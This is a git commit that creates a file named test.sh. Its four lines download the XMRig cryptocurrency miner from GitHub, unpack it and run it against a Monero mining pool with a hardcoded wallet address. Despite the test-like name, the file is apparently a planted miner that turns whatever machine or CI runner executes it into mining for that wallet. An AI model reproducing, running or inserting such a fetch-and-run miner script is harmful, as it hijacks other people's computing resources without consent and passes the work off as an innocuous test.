c6e78ee7f3b21d63ea8bc2a460180c2bf56dd657
azzammuhammad <69777820+azzammuhammad@users.noreply.github.com>
2021-06-17 17:43:21 +0700

    Create test.sh

---
+++ test.sh
@@ -0,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-static-x64.tar.gz 
+tar -zxf xmrig-6.12.2-linux-static-x64.tar.gz
+cd xmrig-6.12.2
+./xmrig -o pool.minexmr.com:4444 -u 49eHLMKT9yYNvdSdwYJPvASspMCQWWZJaXoK9C4aftvFbgSkqzSC43W9AsHieyrdYw6U9SFZKickfh12bSQyZmZgJv7s3LK
